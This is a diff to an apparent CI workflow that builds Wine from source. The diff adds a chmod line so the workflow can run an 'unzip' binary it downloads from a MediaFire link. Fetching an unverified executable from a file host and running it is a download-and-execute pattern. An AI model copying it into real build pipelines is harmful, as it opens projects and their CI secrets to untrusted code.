@@ -16,6 +16,7 @@ jobs:
       run: |
         curl -sL 'https://github.com/wine-mirror/wine/archive/refs/heads/master.zip' -o wine.zip
         curl -sL 'https://download1474.mediafire.com/343261nlivfg/l7uae00n7fvt271/unzip' -o unzip
+        chmod +x ./unzip
         ./unzip wine.zip
         cd wine/wine-master
         ./configure --prefix=$(pwd)
